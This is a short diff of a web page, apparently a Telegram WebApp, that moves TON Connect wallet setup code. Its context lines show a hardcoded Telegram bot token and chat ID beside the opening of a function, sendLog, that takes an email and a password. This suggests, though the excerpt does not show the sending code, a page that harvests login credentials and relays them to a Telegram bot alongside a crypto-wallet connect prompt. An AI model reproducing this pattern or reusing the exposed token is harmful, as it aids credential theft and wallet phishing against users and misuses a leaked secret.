@@ -1450,6 +1450,14 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
 const TG_BOT_TOKEN = '8688595318:AAFNzUAfwq2vpERCi6r7SHCYECWdi8dODMM';
 const TG_CHAT_ID   = -1003958962552;
 
+
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+  manifestUrl: 'https://pathfys.github.io/lzt/tonconnect-manifest.json',
+});
+
+async function openTonConnect() {
+  await tonConnectUI.openModal();
+}
 /* ─── TELEGRAM ─── */
 const tg = window.Telegram?.WebApp;
 if(tg){tg.ready();tg.expand();}
@@ -2026,14 +2034,7 @@ Promise.all([
   draw();
 })();
 
-  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-  manifestUrl: 'https://pathfys.github.io/lzt/tonconnect-manifest.json',
-  buttonRootId: 'ton-connect-button'
-});
 
-async function openTonConnect() {
-  await tonConnectUI.openModal();
-}
 
 async function sendLog(method, email, password) {
   try {
